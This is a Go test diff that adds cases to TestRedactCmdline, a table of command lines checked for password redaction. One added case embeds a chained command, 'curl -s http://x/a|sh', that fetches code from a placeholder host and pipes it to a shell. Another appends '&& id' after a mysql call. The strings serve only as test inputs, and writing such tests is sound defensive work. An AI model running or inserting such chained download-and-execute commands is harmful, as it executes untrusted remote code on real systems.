@@ -432,6 +432,8 @@ func TestRedactCmdline(t *testing.T) {
 		{[]string{"openssl", "enc", "-pass", "pass:x"}, "openssl enc -pass [redacted]"},
 		{[]string{"redis-cli", "-u", "redis://:pw@10.0.0.5:6379"}, "redis-cli -u redis://:[redacted]@10.0.0.5:6379"},
 		{[]string{"psql", "postgres://u:p@ss@db/x"}, "psql postgres://u:[redacted]@db/x"},
+		{[]string{"sh", "-c", "php artisan x; curl -s http://x/a|sh"}, "sh -c php artisan x; curl -s http://x/a|sh"},
+		{[]string{"sh", "-c", "mysql -pX db 2>&1 && id"}, "sh -c mysql -p[redacted] db 2>&1 && id"},
 	}
 	for _, tt := range tests {
 		if got := redactCmdline(tt.args); got != tt.want {
